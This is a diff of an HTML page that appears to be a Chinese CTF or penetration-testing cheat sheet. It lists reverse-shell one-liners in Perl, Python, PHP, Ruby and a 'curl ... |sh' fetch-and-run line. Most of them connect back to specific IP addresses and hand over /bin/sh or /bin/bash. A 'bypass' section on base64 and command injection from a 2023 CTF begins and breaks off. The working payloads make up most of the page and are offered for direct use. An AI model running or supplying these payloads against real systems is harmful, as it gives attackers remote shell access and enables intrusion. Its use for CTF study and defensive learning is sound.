     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code class="language-\" data-lang="\">靶机：perl -e &#39;use Socket;$i=&#34;192.168.1.101&#34;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
+</h2><pre tabindex="0"><code class="language-\" data-lang="\">靶机：perl -e &#39;use Socket;$i=&#34;192.168.1.101&#34;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
 
 或者
 
-perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;192.168.1.101:7777&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre><h6 id="python" class="heading-element"><span>0.0.0.2.7  python</span>
+perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;192.168.1.101:7777&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre><h2 id="python" class="heading-element"><span>python</span>
   <a href="#python" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;8.130.69.158&#34;,7788));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</code></pre><h6 id="curl" class="heading-element"><span>0.0.0.2.8  curl</span>
+</h2><pre tabindex="0"><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;8.130.69.158&#34;,7788));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</code></pre><h2 id="curl" class="heading-element"><span>curl</span>
   <a href="#curl" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code>curl https://your-shell.com/ip:port |sh</code></pre><h6 id="php" class="heading-element"><span>0.0.0.2.9  php</span>
+</h2><pre tabindex="0"><code>curl https://your-shell.com/ip:port |sh</code></pre><h2 id="php" class="heading-element"><span>php</span>
   <a href="#php" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code>php -r &#39;$sock=fsockopen(&#34;8.130.69.158&#34;,7788);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</code></pre><pre tabindex="0"><code>&lt;?php $sock=fsockopen(&#34;192.168.111.128&#34;,7788);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);?&gt;</code></pre><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> <span style="color:#58a1dd">system</span>(<span style="color:#a6be9d">&#39;nc -e /bin/bash 8.130.69.158 7788&#39;</span>);<span style="color:#828b96;font-style:italic">?&gt;</span>
-</span></span></code></pre></div><h6 id="ruby" class="heading-element"><span>0.0.0.2.10  ruby</span>
+</h2><pre tabindex="0"><code>php -r &#39;$sock=fsockopen(&#34;8.130.69.158&#34;,7788);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</code></pre><pre tabindex="0"><code>&lt;?php $sock=fsockopen(&#34;192.168.111.128&#34;,7788);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);?&gt;</code></pre><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> <span style="color:#58a1dd">system</span>(<span style="color:#a6be9d">&#39;nc -e /bin/bash 8.130.69.158 7788&#39;</span>);<span style="color:#828b96;font-style:italic">?&gt;</span>
+</span></span></code></pre></div><h2 id="ruby" class="heading-element"><span>ruby</span>
   <a href="#ruby" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code>ruby -rsocket -e &#39;c=TCPSocket.new(&#34;47.xxx.xxx.72&#34;,&#34;2333&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;
+</h2><pre tabindex="0"><code>ruby -rsocket -e &#39;c=TCPSocket.new(&#34;47.xxx.xxx.72&#34;,&#34;2333&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;
 或
-ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&#34;47.xxx.xxx.72&#34;,&#34;2333&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</code></pre><h5 id="bypass" class="heading-element"><span>0.0.0.3  bypass</span>
+ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&#34;47.xxx.xxx.72&#34;,&#34;2333&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;</code></pre><h1 id="bypass" class="heading-element"><span>bypass</span>
   <a href="#bypass" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="base64" class="heading-element"><span>0.0.0.3.1  base64</span>
+</h1><h2 id="base64" class="heading-element"><span>base64</span>
   <a href="#base64" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>见于ciscn2023华北</p>
+</h2><p>见于ciscn2023华北</p>
 <p>这里存在命令注入点</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306130019352.webp" alt="image-20230613001900157" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306130019352.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306130019352.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306130019352.webp?size=large 2x" data-title="image-20230613001900157" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>这里</p>
